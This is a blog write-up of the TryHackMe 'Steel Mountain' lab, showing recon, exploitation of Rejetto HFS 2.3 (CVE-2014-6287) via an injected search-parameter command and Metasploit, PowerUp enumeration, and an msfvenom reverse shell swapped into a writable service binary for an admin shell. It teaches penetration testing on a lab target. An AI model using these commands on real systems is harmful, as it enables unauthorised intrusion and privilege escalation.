---
layout: md
title: TryHackMe Steelmountain room
description: 
tags: ['security', 'tryhackme']
categories: ['linux', 'security', 'thm']
---

{% include project-headers.html %}

Attacking a Windows based machine.

Includes:
- Recon
  - nmap
  - web apps
  - searchsploit
- Exploit
  - metasploit
- Privilege esculation
  - Enumeration
  - Misconfiguration & exploiting services
  - msfvenom

#### Nmap

Use nmap to scan windows machine. `-Pn` is specified because windows was ignoring icmp requests.

```bash
$> sudo nmap -sS -sV -Pn -vv 10.10.30.80 -oA nmap-results.txt
...

PORT      STATE SERVICE            REASON          VERSION
80/tcp    open  http               syn-ack ttl 127 Microsoft IIS httpd 8.5
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
8080/tcp  open  http               syn-ack ttl 127 HttpFileServer httpd 2.3
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49163/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
```

#### Search for exploits

Find exploits related to the service running on port 8080, Rejetto Http File Server 2.3.

```bash
$> searchsploit "httpfileserver"
...

Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) | windows/webapps/49125.py

$> searchsploit -p windows/webapps/49125.py
[CVE2014-6287](https://www.exploit-db.com/exploits/39161)
```

We can mirror the script shown in searchsploit and take a look at what it does. It just forms a url with a specific search query parameter that allows for remote code execution and makes a request to the service to perform that action.

```bash
$> searchsploit -m windows/webapps/49125.py
$> mv 49125.py command_exec.py

$> python3 command_exec.py 10.10.30.80 8080 whoami
http://10.10.30.80:8080/?search=%00{.+exec|whoami.}
```

The room tells us to use metasploit to perform the exploit though, maybe I will revisit scripting the exploit myself at a later date.

#### Metasploit

Using metasploit to exploit [`CVE2014-6287`](https://www.exploit-db.com/exploits/39161).

```bash
$> sudo msfconsole
msfconsole> search cve:2014-6287
...
0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

msfconsole> use 0 
msfconsole> show options
...

msfconsole> set RHOSTS <ip>
msfconsole> set RPORT 8080
msfconsole> exploit

meterpreter> 
```
This gives us a meterpreter shell as bill now.

#### Enumeration

Performing enumeration to find possible privilege esculation attack vectors using [`PowerUp`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).

```bash
$> wget -c https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
meterpreter> upload /opt/PowerUp.ps1

meterpreter> load powershell
meterpreter> powershell_shell
```

```powershell
PS >. .\PowerUp.ps1
PS > Invoke-AllChecks
...

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files
```

This shows us a service called `AdvancedSystemCareService9` the our user can restart and also has write access to the directory, so we can override the existing executable with our own.

#### `msfvenom` Reverse shell

Creating the reverse shell exe
```bash
$> msfvenom -p windows/shell_reverse_tcp LHOST=10.9.7.128 LPORT=4444 -e x86/shikata_ga_nai -f exe -o msfvenom_reverse_shell.exe
```

Create a listener
```bash
$> nc -lvnp 4444
```

Upload and execute as a service
```bash
meterpreter> upload /opt/msfvenom_reverse_shell.exe
meterpreter> powershell_shell

PS> net stop AdvancedSystemCareService9
PS> cp .\msfvenom_reverse_shell.exe 'C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe'

PS> net start AdvancedSystemCareService9
```

And we have an admin shell via our netcat listener